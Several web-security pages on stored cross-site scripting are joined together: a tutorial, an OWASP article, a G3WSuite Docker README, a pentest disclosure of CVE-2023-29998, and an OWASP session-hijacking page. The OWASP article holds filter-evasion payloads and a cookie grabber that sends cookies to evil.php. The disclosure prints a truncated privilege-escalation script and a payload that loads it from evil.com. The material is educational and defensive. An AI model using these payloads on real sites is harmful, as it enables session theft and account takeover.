# Stored XSS

In this section, we'll explain stored cross-site scripting, describe the impact of stored XSS attacks, and spell out how to find stored XSS vulnerabilities.

## What is stored cross-site scripting?

Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:

`POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100
postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net`

After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:

`<p>This post was extremely helpful.</p>`

Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:

`<script>/* Bad stuff here... */</script>`

Within the attacker's request, this comment would be URL-encoded as:

`comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E`

Any user who visits the blog post will now receive the following within the application's response:

`<p><script>/* Bad stuff here... */</script></p>`

The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application.

## Impact of stored XSS attacks

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. The attacker can carry out any of the actions that are applicable to the impact of [reflected XSS vulnerabilities](/web-security/cross-site-scripting/reflected).

In terms of exploitability, the key difference between reflected and stored XSS is that a stored XSS vulnerability enables attacks that are self-contained within the application itself. The attacker does not need to find an external way of inducing other users to make a particular request containing their exploit. Rather, the attacker places their exploit into the application itself and simply waits for users to encounter it.

The self-contained nature of stored cross-site scripting exploits is particularly relevant in situations where an XSS vulnerability only affects users who are currently logged in to the application. If the XSS is reflected, then the attack must be fortuitously timed: a user who is induced to make the attacker's request at a time when they are not logged in will not be compromised. In contrast, if the XSS is stored, then the user is guaranteed to be logged in at the time they encounter the exploit.

## Stored XSS in different contexts

There are many different varieties of stored cross-site scripting. The location of the stored data within the application's response determines what type of payload is required to exploit it and might also affect the impact of the vulnerability.

In addition, if the application performs any validation or other processing on the data before it is stored, or at the point when the stored data is incorporated into responses, this will generally affect what kind of XSS payload is needed.

## How to find and test for stored XSS vulnerabilities

Many stored XSS vulnerabilities can be found using Burp Suite's web vulnerability scanner.

Testing for stored XSS vulnerabilities manually can be challenging. You need to test all relevant "entry points" via which attacker-controllable data can enter the application's processing, and all "exit points" at which that data might appear in the application's responses.

Entry points into the application's processing include:

* Parameters or other data within the URL query string and message body.
* The URL file path.
* HTTP request headers that might not be exploitable in relation to reflected XSS.
* Any out-of-band routes via which an attacker can deliver data into the application. The routes that exist depend entirely on the functionality implemented by the application: a webmail application will process data received in emails; an application displaying a Twitter feed might process data contained in third-party tweets; and a news aggregator will include data originating on other web sites.

The exit points for stored XSS attacks are all possible HTTP responses that are returned to any kind of application user in any situation.

The first step in testing for stored XSS vulnerabilities is to locate the links between entry and exit points, whereby data submitted to an entry point is emitted from an exit point. The reasons why this can be challenging are that:

* Data submitted to any entry point could in principle be emitted from any exit point. For example, user-supplied display names could appear within an obscure audit log that is only visible to some application users.
* Data that is currently stored by the application is often vulnerable to being overwritten due to other actions performed within the application. For example, a search function might display a list of recent searches, which are quickly replaced as users perform other searches.

To comprehensively identify links between entry and exit points would involve testing each permutation separately, submitting a specific value into the entry point, navigating directly to the exit point, and determining whether the value appears there. However, this approach is not practical in an application with more than a few pages.

Instead, a more realistic approach is to work systematically through the data entry points, submitting a specific value into each one, and monitoring the application's responses to detect cases where the submitted value appears. Particular attention can be paid to relevant application functions, such as comments on blog posts. When the submitted value is observed in a response, you need to determine whether the data is indeed being stored across different requests, as opposed to being simply reflected in the immediate response.

When you have identified links between entry and exit points in the application's processing, each link needs to be specifically tested to detect if a stored XSS vulnerability is present. This involves determining the context within the response where the stored data appears and testing suitable candidate XSS payloads that are applicable to that context. At this point, the testing methodology is broadly the same as for finding [reflected XSS vulnerabilities](/web-security/cross-site-scripting/reflected).

# Cross Site Scripting (XSS)

**Author:** KirstenS

**Contributor(s):** Jim Manico, Jeff Williams, Dave Wichers, Adar Weidman, Roman, Alan Jex, Andrew Smith, Jeff Knutson, Imifos, Erez Yalon, kingthorin, Vikas Khanna. Grant Ongers

## Overview

Cross-Site Scripting (XSS) attacks are a type of injection, in which
malicious scripts are injected into otherwise benign and trusted
websites. XSS attacks occur when an attacker uses a web application to
send malicious code, generally in the form of a browser side script, to
a different end user. Flaws that allow these attacks to succeed are
quite widespread and occur anywhere a web application uses input from a
user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting
user. The end user’s browser has no way to know that the script should
not be trusted, and will execute the script. Because it thinks the
script came from a trusted source, the malicious script can access any
cookies, session tokens, or other sensitive information retained by the
browser and used with that site. These scripts can even rewrite the
content of the HTML page. For more details on the different types of XSS
flaws, see: [Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting).

## Description

Cross-Site Scripting (XSS) attacks occur when:

1. Data enters a Web application through an untrusted source, most frequently a web request.
2. The data is included in dynamic content that is sent to a web user without being validated for malicious content.

The malicious content sent to the web browser often takes the form of a
segment of JavaScript, but may also include HTML, Flash, or any other
type of code that the browser may execute. The variety of attacks based
on XSS is almost limitless, but they commonly include transmitting
private data, like cookies or other session information, to the
attacker, redirecting the victim to web content controlled by the
attacker, or performing other malicious operations on the user’s machine
under the guise of the vulnerable site.

### Reflected and Stored XSS Attacks

XSS attacks can generally be categorized into two categories: reflected
and stored. There is a third, much less well-known type of XSS attack
called [DOM Based XSS](../DOM_Based_XSS) that is discussed
separately [here](../DOM_Based_XSS).

#### Reflected XSS Attacks

Reflected attacks are those where the injected script is reflected off
the web server, such as in an error message, search result, or any other
response that includes some or all of the input sent to the server as
part of the request. Reflected attacks are delivered to victims via
another route, such as in an e-mail message, or on some other website.
When a user is tricked into clicking on a malicious link, submitting a
specially crafted form, or even just browsing to a malicious site, the
injected code travels to the vulnerable web site, which reflects the
attack back to the user’s browser. The browser then executes the code
because it came from a “trusted” server. Reflected XSS is also sometimes
referred to as Non-Persistent or Type-I XSS (the attack is carried out
through a single request / response cycle).

#### Stored XSS Attacks

Stored attacks are those where the injected script is permanently stored
on the target servers, such as in a database, in a message forum,
visitor log, comment field, etc. The victim then retrieves the malicious
script from the server when it requests the stored information. Stored
XSS is also sometimes referred to as Persistent or Type-II XSS.

#### Blind Cross-site Scripting

Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attacker’s payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attacker’s submitted form via the backend application, the attacker’s payload will get executed.
Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter.

### Other Types of XSS Vulnerabilities

In addition to Stored and Reflected XSS, another type of XSS, [DOM Based
XSS](../DOM_Based_XSS) was identified by [Amit Klein
in 2005](http://www.webappsec.org/projects/articles/071105.shtml). OWASP
recommends the XSS categorization as described in the OWASP Article:
[Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting), which covers all
these XSS terms, organizing them into a matrix of Stored vs. Reflected
XSS and Server vs. Client XSS, where DOM Based XSS is a subset of Client
XSS.

#### XSS Attack Consequences

The consequence of an XSS attack is the same regardless of whether it is
stored or reflected ([or DOM Based](../DOM_Based_XSS)). The
difference is in how the payload arrives at the server. Do not be fooled
into thinking that a “read-only” or “brochureware” site is not
vulnerable to serious reflected XSS attacks. XSS can cause a variety of
problems for the end user that range in severity from an annoyance to
complete account compromise. The most severe XSS attacks involve
disclosure of the user’s session cookie, allowing an attacker to hijack
the user’s session and take over the account. Other damaging attacks
include the disclosure of end user files, installation of Trojan horse
programs, redirecting the user to some other page or site, or modifying
presentation of content. An XSS vulnerability allowing an attacker to
modify a press release or news item could affect a company’s stock price
or lessen consumer confidence. An XSS vulnerability on a pharmaceutical
site could allow an attacker to modify dosage information resulting in
an overdose. For more information on these types of attacks see
[Content\_Spoofing](../Content_Spoofing).

### How to Determine If You Are Vulnerable

XSS flaws can be difficult to identify and remove from a web
application. The best way to find flaws is to perform a security review
of the code and search for all places where input from an HTTP request
could possibly make its way into the HTML output. Note that a variety of
different HTML tags can be used to transmit a malicious JavaScript.
Nessus, Nikto, and some other available tools can help scan a website
for these flaws, but can only scratch the surface. If one part of a
website is vulnerable, there is a high likelihood that there are other
problems as well.

### How to Protect Yourself

The primary defenses against XSS are described in the [OWASP XSS Prevention Cheat
Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

Also, it’s crucial that you turn off HTTP TRACE support on all web
servers. An attacker can steal cookie data via Javascript even when
document.cookie is disabled or not supported by the client. This attack
is mounted when a user posts a malicious script to a forum so when
another user clicks the link, an asynchronous HTTP Trace call is
triggered which collects the user’s cookie information from the server,
and then sends it over to another malicious server that collects the
cookie information so the attacker can mount a session hijack attack.
This is easily mitigated by removing support for HTTP TRACE on all web
servers.

The [OWASP ESAPI project](https://www.owasp.org/www-project-enterprise-security-api) has produced a set of
reusable security components in several languages, including validation
and escaping routines to prevent parameter tampering and the injection
of XSS attacks. In addition, the [OWASP WebGoat Project](https://www.owasp.org/www-project-webgoat/) training
application has lessons on Cross-Site Scripting and data encoding.

### Alternate XSS Syntax

#### XSS Using Script in Attributes

XSS attacks may be conducted without using `<script>...</script>`
tags. Other tags will do exactly the same thing, for example:
`<body onload=alert('test1')>` or other attributes like: `onmouseover`, `onerror`.

##### onmouseover

`<b onmouseover=alert('Wufff!')>click me!</b>`

##### onerror

`<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`

#### XSS Using Script Via Encoded URI Schemes

If we need to hide against web application filters we may try to encode
string characters, e.g.: `a=&\#X41` (UTF-8) and use it in `IMG` tags:

`<IMG SRC=j&#X41vascript:alert('test2')>`

There are many different UTF-8 encoding notations that give us even more
possibilities.

#### XSS Using Code Encoding

We may encode our script in base64 and place it in `META` tag. This way we
get rid of `alert()` totally. More information about this method can be
found in RFC 2397

```
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">

```

These and others examples can be found at the OWASP [XSS Filter Evasion Cheat Sheet](../../xss-filter-evasion-cheatsheet) which is a true
encyclopedia of the alternate XSS syntax attack.

## Examples

Cross-site scripting attacks may occur anywhere that possibly malicious
users are allowed to post unregulated material to a trusted website for
the consumption of other valid users.

The most common example can be found in bulletin-board websites which
provide web based mailing list-style functionality.

### Example 1

The following JSP code segment reads an employee ID, eid, from an HTTP
request and displays it to the user.

```
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>

```

The code in this example operates correctly if `eid` contains only
standard alphanumeric text. If `eid` has a value that includes
meta-characters or source code, then the code will be executed by the
web browser as it displays the HTTP response.

Initially, this might not appear to be much of a vulnerability. After
all, why would someone enter a URL that causes malicious code to run on
their own computer? The real danger is that an attacker will create the
malicious URL, then use e-mail or social engineering tricks to lure
victims into visiting a link to the URL. When victims click the link,
they unwittingly reflect the malicious content through the vulnerable
web application back to their own computers. This mechanism of
exploiting vulnerable web applications is known as Reflected XSS.

### Example 2

The following JSP code segment queries a database for an employee with a
given ID and prints the corresponding employee’s name.

```
<%...
 Statement stmt = conn.createStatement();
 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
 if (rs != null) {
  rs.next();
  String name = rs.getString("name");
%>

Employee Name: <%= name %>

```

As in Example 1, this code functions correctly when the values of name
are well-behaved, but it does nothing to prevent exploits if they are
not. Again, this code can appear less dangerous because the value of
name is read from a database, whose contents are apparently managed by
the application. However, if the value of name originates from
user-supplied data, then the database can be a conduit for malicious
content. Without proper input validation on all data stored in the
database, an attacker can execute malicious commands in the user’s web
browser. This type of exploit, known as Stored XSS, is particularly
insidious because the indirection caused by the data store makes it more
difficult to identify the threat and increases the possibility that the
attack will affect multiple users. XSS got its start in this form with
websites that offered a “guestbook” to visitors. Attackers would include
JavaScript in their guestbook entries, and all subsequent visitors to
the guestbook page would execute the malicious code.

As the examples demonstrate, XSS vulnerabilities are caused by code that
includes unvalidated data in an HTTP response. There are three vectors
by which an XSS attack can reach a victim:

* As in Example 1, data is read directly from the HTTP request and
  reflected back in the HTTP response. Reflected XSS exploits occur
  when an attacker causes a user to supply dangerous content to a
  vulnerable web application, which is then reflected back to the user
  and executed by the web browser. The most common mechanism for
  delivering malicious content is to include it as a parameter in a
  URL that is posted publicly or e-mailed directly to victims. URLs
  constructed in this manner constitute the core of many phishing
  schemes, whereby an attacker convinces victims to visit a URL that
  refers to a vulnerable site. After the site reflects the attacker’s
  content back to the user, the content is executed and proceeds to
  transfer private information, such as cookies that may include
  session information, from the user’s machine to the attacker or
  perform other nefarious activities.
* As in Example 2, the application stores dangerous data in a database
  or other trusted data store. The dangerous data is subsequently read
  back into the application and included in dynamic content. Stored
  XSS exploits occur when an attacker injects dangerous content into a
  data store that is later read and included in dynamic content. From
  an attacker’s perspective, the optimal place to inject malicious
  content is in an area that is displayed to either many users or
  particularly interesting users. Interesting users typically have
  elevated privileges in the application or interact with sensitive
  data that is valuable to the attacker. If one of these users
  executes malicious content, the attacker may be able to perform
  privileged operations on behalf of the user or gain access to
  sensitive data belonging to the user.
* A source outside the application stores dangerous data in a database
  or other data store, and the dangerous data is subsequently read
  back into the application as trusted data and included in dynamic
  content.

### Attack Examples

**Example 1: Cookie Grabber**

If the application doesn’t validate the input data, the attacker can
easily steal a cookie from an authenticated user. All the attacker has
to do is to place the following code in any posted input(ie: message
boards, private messages, user profiles):

```
<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>

```

The above code will pass an escaped content of the cookie (according to
RFC content must be escaped before sending it via HTTP protocol with GET
method) to the evil.php script in “cakemonster” variable. The attacker
then checks the results of their evil.php script (a cookie grabber script
will usually write the cookie to a file) and use it.

### Error Page Example

Let’s assume that we have an error page, which is handling requests for
a non existing pages, a classic 404 error page. We may use the code
below as an example to inform user about what specific page is missing:

```
<html>
<body>
<?php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>

</body>
</html>

```

Let’s see how it works: `http://testsite.test/file_which_not_exist`
In response we get: `Not found: /file_which_not_exist`

Now we will try to force the error page to include our code: `http://testsite.test/<script>alert("TEST");</script>`
The result is: `Not found: / (but with JavaScript code <script>alert("TEST");</script>)`

We have successfully injected the code, our XSS! What does it mean? For
example, that we may use this flaw to try to steal a user’s session
cookie.

Run a self hosted web-gis application with Docker Compose

## ⬆️ How to upgrade from v3.7 to v3.8

Since **v3.8** PostgreSQL/PostGIS changed from **v11/2.5** to **v16/3.4**, to upgrade follow below steps:

```
# NB:
# • (ENV = dev)      → docker-compose-dev.yml
# • (ENV = prod)     → docker-compose.yml
# • (ENV = consumer) → docker-compose-consumer.yml

### BACKUP (v3.7.x) ###

docker compose up -f docker-compose-dev.yml up -d

git fetch
git checkout v3.8.x

make db-backup ID=11 ENV=prod

### RESTORE (v3.8.x) ###

make db-restore ID=11 ENV=prod

### OPTIONAL (delete old DB) ###

docker compose exec g3w-suite bash -c 'rm -r /shared-volume/11'
docker compose exec g3w-suite bash -c 'rm -r /shared-volume/backup/11'
```

## 🌍 Deploying your webgis app

Install [docker compose](https://docs.docker.com/compose/install/).

Clone this repository:

```
git clone https://github.com/g3w-suite/g3w-suite-docker/
cd g3w-suite-docker

```

Create a `.env` file starting from [`.env.example`](/g3w-suite/g3w-suite-docker/blob/dev/.env.example) and tailor it to your needs:

```
# CHANGE ME: PostGIS DB password

- G3WSUITE_POSTGRES_PASS='89#kL8y3D'
+ G3WSUITE_POSTGRES_PASS=<your__password>
```

Start containers:

```
docker-compose up -d
```

or, if you intend to use [huey](https://github.com/coleifer/huey) (batch processing)

```
docker-compose -f docker-compose-consumer.yml up -d
```

**NB:** at the very first start, have a lot of patience 😴 → the system must finalize the installation. \*

After some time the suite will be available at:

* <http://localhost:8080> (user: `admin`, pass: `admin`)

[![Login Page](/g3w-suite/g3w-suite-docker/raw/dev/docs/img/login_page.png)](/g3w-suite/g3w-suite-docker/blob/dev/docs/img/login_page.png)

\* in case of faulty container (eg. the first time you didn't wait long enough before trying to access):

```
# 🚨 deletes all data
make db-reset ENV=prod

# or
# make db-reset ENV=consumer
```

## 💻 How to access into a container

1. login into a service

```
$ make run-postgis ENV=prod

# make run-g3w-suite ENV=prod
# make run-nginx ENV=prod
# make run-redis ENV=prod
```

2. perform your administrative tasks (eg. connect to postgis as "postgres" user):

```
root@84ef6a8d23e6:/# su - postgres

postgres@84ef6a8d23e6:~$ psql
psql (11.2 (Debian 11.2-1.pgdg90+1))
Type "help" for help.

postgres=#
```

## 🔒 HTTPS

To enable https with LetsEncrypt::

* uncomment ssl section within `config/nginx/nginx.conf`
* update `WEBGIS_PUBLIC_HOSTNAME` environment variable within the `.env` and `config/nginx/nginx.conf` files
* launch `sudo make renew-ssl`
* make sure the certs are renewed by adding a cron job with `sudo crontab -e` and add the following line:
  `0 3 * * * /<path_to_your_docker_files>/run_certbot.sh`

## 📦 Docker image

Docker compose will usually download images from: <https://hub.docker.com/u/g3wsuite>

A custom (local) docker image for the suite can be created with:

```
docker build -f Dockerfile.g3wsuite.dockerfile -t g3wsuite/g3w-suite:dev --no-cache .

# OPTIONAL:
# docker build -f Dockerfile.g3wsuite-deps.ltr.dockerfile -t g3wsuite/g3w-suite-deps-ltr:dev --no-cache .
```

The image is build on latest Ubuntu and QGIS LTR, following this execution order:

1. [Dockerfile.g3wsuite-deps.ltr.dockerfile](/g3w-suite/g3w-suite-docker/blob/dev/Dockerfile.g3wsuite-deps.ltr.dockerfile) ← installs Ubuntu and QGIS LTR
2. [Dockerfile.g3wsuite.dockerfile](/g3w-suite/g3w-suite-docker/blob/dev/Dockerfile.g3wsuite.dockerfile) ← run "setup.sh" and "docker-entrypoint.sh"
3. [scripts/setup.sh](/g3w-suite/g3w-suite-docker/blob/dev/scripts/setup.sh) ← install g3w-admin and some other python plugins
4. [scripts/docker-entrypoint.sh](/g3w-suite/g3w-suite-docker/blob/dev/scripts/docker-entrypoint.sh) ← start gunicorn

## 🎨 Style customization

* custom templates folder: `config/g3w-suite/overrides/templates` → a Docker service restart is required to make the changes effective.
* custom logo (see: [docs](https://g3w-suite.readthedocs.io/en/latest/settings.html#general-layout-settings)): `config/g3w-suite/settings_docker.py` → a Docker service restart is required to make the changes effective.
* custom CSS: `config/g3w-suite/overrides/static/style.css` → changes are effective immediately

## 🚀 Performance optimizations

1. set scale-dependent visibility for the entire layer or for some filtered features (example: show only major roads until at scale 1:1E+6)
2. when using rule-based/categorized classification or scale-dependent visibility create indexes on the column(s) involved in the rule expression (example: "create index idx\_elec\_penwell\_ious on elec\_penwell\_ious (owner);" )
3. start the project with only a few layers turned on by default
4. do not turn on by default base-layers XYZ such as (Google base maps)
5. do not use rule-based/categorized rendering on layers with too many categories (example: elec\_penwell\_public\_power), they are unreadable anyway
6. enable redering simplification for not-point layers, set it to `Distance` `1.2` and check `Enable provider simplification if available`
7. enable cache on linestring and polygon layers (tile cache can be configured and cleared per-layer through the webgis admin panel and lasts forever until it is disabled or cleared)
8. set a cron job on host machine that checks edited features that have been locked for more than 4 hours and frees them:

```
0 */1 * * * docker exec g3w-suite-docker_g3w-suite_1 python3 /code/g3w-admin/manage.py check_features_locked

```

## 🐋 Portainer usage

Portainer (<https://www.portainer.io>) is a docker-based web application used to edit and manage Docker applications in a simple and intuitive way.

Plese refer to the [Add new stack](https://docs.portainer.io/user/docker/stacks/add) section to learn how to deploy the `docker-compose-consumer.yml` stack with Portainer (>= v2.1.1).

## ♻️ Database backup / restore

```
# NB:
# • (ENV = dev)      → docker-compose-dev.yml
# • (ENV = prod)     → docker-compose.yml
# • (ENV = consumer) → docker-compose-consumer.yml

docker compose up -f docker-compose.yml up -d

make backup-db ID=foo-backup ENV=prod
make restore-db ID=foo-backup ENV=prod
```

# GIS3W: Persistent XSS in G3WSuite 3.5 – CVE-2023-29998

## Overview

During an engagement on a client’s public infrastructure, we detected an exposed installation of G3WSuite. Since we were asked to perform a black box pentest on the G3WSuite installation, we had to find a way to gather as much information about the target as possible. Luckily for us, the whole G3WSuite codebase is hosted on GitHub (link [here)](https://github.com/g3w-suite), and the maintainers provided very easy-to-follow setup instructions. Playing around with a local installation of G3WSuite for a while, we found a persistent Cross-Site Scripting ([XSS](https://owasp.org/www-community/attacks/xss/)) vulnerability.

## Technical details

### Environment setup

After a successful installation of **G3WSuite** version **3.5** following the instructions detailed [here](https://github.com/g3w-suite/g3w-suite-docker), the landing page of the application should look like the one shown in *Figure 01*.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x48.jpg)

*Figure 01 – G3WSuite landing page*

Log in the application backend as the `admin` user and create a low-privileged user, named `alice` (a.k.a. the attacker), with editor rights assigned to, as shown in *Figure 02* (use built-in roles such as `Editor Level 1`) ;  notice that other privileges (`superuser`, `staff`) should **not** be assigned to `alice`.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x32.jpg)

*Figure 02 – Users view from the admin dashboard*

Create a new cartographic group, named `Cartograhpic Group`*,*  and select `alice` as the `Editor1 user` role in the `ACL Users` section of the newly created group, as shown in *Figure 03*. This step is necessary to allow `alice` to edit the group input fields (Name, Title, Description, …).

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x46.jpg)

*Figure 03 – Admin view of Cartographic group*

### Payload Delivery

Log in to the backend as `alice`, then select the edit option next to the `Cartographic group` card in order  to enter edit mode (this would not be possible if  `alice` was not granted `Editor1 user` role).

> From the buttons at the top of the`Description` widget (*Figure 03*, *Figure 04*), we assumed that this field could be used for embedding HTML content inside the group description. From an attacker perspective this is a great place to hunt for XSS.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x30.jpg)

Figure 04 – A*lice view of Cartographic group*

The proof of concept in *Snippet 01* is used to inject and execute a simple XSS payload.

```
<script>alert(document.domain)</script>
```

*Snippet 01 – XSS payload used to execute the alert function*

> The execution of the `alert()` function is sufficient to demonstrate that an input field is vulnerable to JavaScript injection, while the visualization of the `document.domain` element proves that it is possible to access DOM elements using XSS.

Intercept the HTTP request used to update the group information with a web proxy and add the XSS payload shown in *Snippet 01* to the description text.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x50.jpg)

*Figure 05 – HTTP request containing the XSS payload to execute the alert function*

Once the Description field has been updated (*Figure 05*), the XSS payload is saved by the backend. The main feature of a [persistent XSS](https://portswigger.net/web-security/cross-site-scripting/stored) is the possibility to store payloads for later execution.

### Payload Execution

Every time a user logs in via the administration page (*Figure 06*), the application loads and execute the injected payload, as shown in *Figure 07*. Let’s show this by accessing the application as `admin`.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x48.jpg)

*Figure 06 – Administration login page*

The `alert(document.domain)` payload executes as soon as the user logs in (*Figure 07*). Notice that **no further actions are required** **for the malicious code to activate**.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x27.jpg)

*Figure 07 – XSS payload executed as the user logs in*

###

### Privilege Escalation

After reviewing the possibility to execute JavaScript within the context of any (`admin` included) user (*Figure 07*), we tried to demonstrate that the vulnerability could be leveraged to obtain admin privileges.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x71.jpg)

Since the [HttpOnly](https://owasp.org/www-community/HttpOnly) attribute protected the session cookies from access through JavaScript code, the standard cookie-stealing XSS attack was not possible.

It was, however, possible for an attacker to [hijack](https://owasp.org/www-community/attacks/Session_hijacking_attack) another (`admin`) user session to performs privileged operations. After a quick analysis of the Django administrative panel, we developed a simple JavaScript snippet, named `privesc.js` (*Snippet 02*), that could be used to assign `superuser` privileges to `alice`.

```
// content of privesc.js
// type the name of the user to elevate
const user = "alice"

// STEP 1: navigate to the django admin panel
fetch('/en/django-admin/auth/user/')
    .then(response => response.text())
    .then(html => {
        var parser = new DOMParser()
        var doc = parser.parseFromString(html, 'text/html')
        var userUpdateLink = ""
        var userLink = doc.querySelectorAll('a[href*="/en/django-admin/auth/user/"]')
        // navigate to the specified user update page
        userLink.forEach(link => {

            // STEP 2: access the specified user update page
            if (link.textContent.includes(user)) {
                userUpdateLink = link.href;
                console.log("[+] Found URL: "+userUpdateLink)
                fetch(userUpdateLink)
                .then(response => response.text())
                .then(html => {
                    var parser = new DOMParser()
                    var doc = parser.parseFromString(html, 'text/html')

                    var formData = new FormData()

                    inputs = doc.querySelectorAll('input')
                    inputs.forEach(input => {
                        formData.append(input.name, input.value)
                    })

                    // missing data
                    formData.append("groups", '4')
                    formData.append("user_permissions", '9')
                    formData.append("userdata-0-department", "")
                    formData.append("userdata-__prefix__-department", "")

                    // select id=id_userbackend-0-backend
                    var backend = doc.querySelectorAll('#id_userbackend-0-backend > option')[0].value

                    formData.append("userbackend-0-backend", backend)
                    formData.append("userbackend-0-options", "")
                    formData.append("userbackend-__prefix__-backend", backend)
                    formData.append("userbackend-__prefix__-options", "")

                    // images
                    const blob = new Blob([''], { type: "application/octet-stream" });
                    formData.set("userdata-0-avatar", blob, "")
                    formData.set("userdata-__prefix__-avatar", blob, "")

                    // remove useless commands
                    formData.delete("_addanother")
                    formData.delete("_continue")
                    formData.delete("userdata-0-avatar-clear")

*Snippet 02 – JavaScript code used to update alice privileges*

We configured an external web server `evil.com`, as shown in *Figure 08*, that we used to serve the `privesc.js` script (*Snippet 02*).

*Figure 08 – External server setup*

Logged in as `alice`, we injected the payload in *Snippet 03* inside the vulnerable request, in order to load the malicious `privesc.js` script from the external web server `evil.com`, as shown in *Figure 09*.

```
<script src="http://evil.com/privesc.js"></script>
```

*Snippet 03 – XSS payload used to load the external script*

*Figure 09 – HTTP request containing the XSS payload used for privilege escalation*

As `admin` logged in, the external script executed the attack, as shown in the victim browser console in *Figure 10*.

*Figure 10 – XSS execution log*

As it can be seen in *Figure 11*, `alice` was assigned the `superuser` role by the JavaScript payload execution, and could therefore access the administration panel of G3WSuite.

## Concluding remarks

In this blog post we showed that it was possible to compromise the security of an application that includes a vulnerable third-party component missing the proper sanitizations. Specifically, the vulnerability described here allowed an editor user to inject arbitrary JavaScript code inside the application backend. The injected client-side code would be executed every time a user logged in. Despite the session cookies were protected against XSS attacks, an attacker could exploit this vulnerability to impersonate other—possibly administrative—users, in order to:

* create/update/remove users (privilege escalation)
* reset the administrator password (DoS)
* replace the content of the application (website defacement)

It is therefore recommended to always enforce validations on the user-supplied (and therefore potentially malicious) input regarding the application components.

# Session hijacking attack

Thank you for visiting OWASP.org. We have migrated our community to a new web platform and regretably the content for this page needed to be programmatically ported from its previous wiki page. There’s still some work to be done.

This is an example of a Project or Chapter Page.

## Description

The Session Hijacking attack consists of the exploitation of the web
session control mechanism, which is normally managed for a session
token.

Because http communication uses many different TCP connections, the web
server needs a method to recognize every user’s connections. The most
useful method depends on a token that the Web Server sends to the client
browser after a successful client authentication. A session token is
normally composed of a string of variable width and it could be used in
different ways, like in the URL, in the header of the http requisition
as a cookie, in other parts of the header of the http request, or yet in
the body of the http requisition.

The Session Hijacking attack compromises the session token by stealing
or predicting a valid session token to gain unauthorized access to the
Web Server.

The session token could be compromised in different ways; the most
common are:

* Predictable session token;
* Session Sniffing;
* Client-side attacks (XSS, malicious JavaScript Codes, Trojans, etc);
* [Man-in-the-middle attack](Man-in-the-middle_attack "wikilink")
* [Man-in-the-browser attack](Man-in-the-browser_attack "wikilink")

## Examples

### Example 1

#### Session Sniffing

In the example, as we can see, first the attacker uses a sniffer to
capture a valid token session called “Session ID”, then they use the
valid token session to gain unauthorized access to the Web Server.

![Session sniffing](../assets/images/attacks/session-hijacking.jpg)

*Figure 1. Manipulating the token session executing the session hijacking
attack.*

### Example 2

#### Cross-site script attack

The attacker can compromise the session token by using malicious code or
programs running at the client-side. The example shows how the attacker
could use an XSS attack to steal the session token. If an attacker sends
a crafted link to the victim with the malicious JavaScript, when the
victim clicks on the link, the JavaScript will run and complete the
instructions made by the attacker. The example in figure 3 uses an XSS
attack to show the cookie value of the current session; using the same
technique it’s possible to create a specific JavaScript code that will
send the cookie to the attacker.

```
<SCRIPT>

alert(document.cookie);

</SCRIPT>

```

**Other Examples** The following attacks intercept the information
exchange between the client and the server:

* [Man-in-the-middle attack](Man-in-the-middle_attack "wikilink")
* [Man-in-the-browser attack](Man-in-the-browser_attack "wikilink")
